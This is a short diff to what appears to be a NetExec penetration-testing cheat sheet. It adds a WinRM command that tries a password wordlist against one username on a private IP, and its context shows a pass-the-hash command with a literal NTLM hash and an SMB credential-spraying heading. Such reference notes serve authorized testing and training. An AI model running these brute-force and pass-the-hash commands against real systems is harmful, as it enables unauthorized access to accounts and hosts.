@@ -34,6 +34,12 @@
 ./nxc winrm targets.txt -u Administrator -H b99ed3c3d34c4576bcd33c76420be934
 ```
 
+* winrm with a single username and a password wordlist
+
+```
+./nxc winrm 172.16.1.101 -u dan.hard -p 172.16.1.101/passwordlist.txt 
+```
+
 ### SMB
 
 * attempt smb authentication to multiple hosts with one set of credentials&#x20;
